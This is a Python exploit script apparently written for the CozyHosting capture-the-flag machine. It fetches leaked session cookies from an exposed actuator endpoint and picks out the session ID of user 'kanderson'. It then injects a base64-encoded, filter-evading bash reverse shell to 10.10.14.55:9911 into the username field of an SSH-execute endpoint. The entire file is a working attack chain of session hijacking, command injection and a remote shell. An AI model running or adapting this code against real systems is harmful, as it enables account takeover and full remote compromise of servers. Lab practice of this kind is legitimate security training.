import os
import json
import urllib.parse

#Get the session cookies
curlCommand="curl -s  http://cozyhosting.htb/actuator/sessions -o outfile.txt"

exitCode=os.system(curlCommand);

if exitCode==0:
    print("JSESSIONID retrieved successfully")
else:
    print("Ooops, Cookie not retrieved")

# A function to Clean outputs by removing the exit codes
def cleaning(filename):
    with open(filename, 'r') as file:
        file_content = file.read()

    # Remove the trailing "0" from each line
    cleaned_lines = [line.rstrip('0') for line in file_content.split('\n')]

    # Join the lines back into a single string
    cleaned_content = '\n'.join(cleaned_lines)
    return cleaned_content

cleaned_content=cleaning('outfile.txt')

# Now you can work with the cleaned content as JSON
try:
    cookies = json.loads(cleaned_content)
    # print(cookies)
except json.JSONDecodeError:
    print("Invalid JSON format after cleaning the content.")

# specify the value we need to fetch
target_username = "kanderson"
# Initialize ID to None
target_id = None

# Iterate through key-value pairs
for key, value in cookies.items():
    if value == target_username:
        target_id = key
        break  # Exit the loop once a match is found

# Print the result
if target_id is not None:
    print(f"The ID for {target_username} is: {target_id}")
else:
    print(f"No matching ID found for {target_username}")


# encoding the payload using base64
encoded=os.system("echo 'bash -i >& /dev/tcp/10.10.14.55/9911 0>&1'| base64 -w 0 > encoded.txt") # CHANGE IP HERE
encoded=cleaning('encoded.txt')

#final payload
final=';echo${IFS%??}"' + encoded + '"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;'
urlencode=urllib.parse.quote(final, encoding='utf-8')
finalPayload=f"host=127.0.0.1&username={urlencode}"
#send the payload

print(f"The final payload is:{finalPayload}")

# open shell
print("Opening the shell .................")
os.system(f"curl -X POST http://cozyhosting.htb/executessh --cookie 'JSESSIONID={target_id}' --data-binary '{finalPayload}'")
